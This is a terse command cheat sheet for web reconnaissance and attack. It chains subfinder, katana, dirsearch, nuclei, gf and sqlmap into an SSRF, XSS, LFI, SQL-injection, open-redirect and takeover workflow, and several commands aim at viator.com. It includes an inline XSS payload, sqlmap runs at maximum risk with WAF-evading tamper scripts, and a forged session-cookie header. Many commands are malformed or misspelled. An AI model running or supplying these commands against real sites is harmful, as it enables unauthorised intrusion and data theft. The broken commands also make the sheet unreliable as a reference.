	#sub-domain_ennumiration
subfinder -d viator.com -all  -recursive > subdomain.txt
assetfinder www.example.com | anew assets.txt
amass enum -timeout 60 -d www.target.txt
sublist3r -d www.taget.com
 
	 
	 #active-domain ennumiration 
cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt


	#finding-urls_domain-subdomains
cat alive.txt | gau > param.txt
/root/go/bin/katana -u alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
cat alive.txt | /root/go/bin/katana -o allurls.txt
/root/go/bin/katana -i alive.txt | anew allurls.txt
cat alive.txt | /root/go/bin/waybackurls | anew allurls.txt

	#filter/delete-duplicate-urls
cat allurls.txt | uro | anew filterurls.txt


	#find_js-files_from-urls
cat filterurls.txt | grep ".js$" > jsfiles.txt
cat filterurls.txt | grep "$.js$" > jsfiles.txt
cat filterurls.txt | grep "$.js" > jsfiles.txt

	#find_mulfiple-files
cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"

 	
	#scan_open-ports
nabbu -list domain.txt -c 50 -nmap-cli 'nmap -sV -sC' -o nabbufull.txt
nabbu -list domain.txt -c 50 -nmap-cli 'nmap -sVC' -o nabbufull.txt  (-f,-Pn,-SS,-d,-6)


	#directory_bruteforcing
dirsearch -l alive.txt -x 500,200,502,429,404,400 -R 5 --random-agent -t 100 -F -o directory.txt -w (wordlist)
dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json


	#ssrf-in_jsfile-and-aurls
cat alive.txt | gauplus -subs -b png,jpg,jpeg,woff,gif,svg,swf -o ssrfurls.txt
cat allurls | gf redirect | ssrfurls.txt
cat allurls | grep "=" | ssrfurls.txt
	#
cat ssrfurls.txt | grep "="  | /root/go/bin/qsreplace http://www.(burp-colabrattor) | anew ssrf.txt
cat ssrf.txt | httpx-toolkit -fr

	
	#xss_in_urls-jsfiles
subfinder -d viator.com | httpx-toolkit -silent |  /root/go/bin/katana -ps -f qurl | gf xss | /root/go/bin/bxss -appendMode -payload '(payload)' -parameters	
echo https://target.com /root/go/bin/katana -ps -f qurl | gf xss | /root/go/bin/bxss -appendMode -payload '<IMG SRC=`javascript:javascript:alert(1)`>' -parameters
cat allurls.txt | gf xss | xss.txt
python3 XSSstrike -u target.txt 

	#find-lfi
cat  allurls.txt | gf lfi | lfi.txt
/root/go/bin/nuclei -l lfi.txt -tags lfi 

	
	#find_sql-injection
sqlmap -u https://www.target.com/ --crawl=1-8 --risk=1-3, --batch --level=1-5 
sqlmap -u https://www.tager.com/ --dbs --batch --risk 3 --ignore-code 404  --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
sqlmap -u https://www.target.com/?login=17782


	#subdomain-takeover
python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
nuclei -list subdomains_alive.txt -t /root/nuclei-tamplets/http/takeovers


	#custom-nuclei-scan
nuclei  -list ~/example/subdomains_alive.txt -tags cve,osint,tech


	#open-redirect
cat allurls.txt | gf redirect | openredirex -p /root/openredirex/payloads.txt
cat allurls.txt | gf redirect | anew redirects.txt


	#jsfiles-vuln
echo www.viator.com | root/go/bin/katana -ps | grep -E "\.js$" | /root/go/bin/nuclei -t /root/nuclei-templates/http/exposures/ -c 30
/root/go/bin/nuclei -l js.txt -t /root/nuclei-templates/http/exposures/ -c 30








 
	
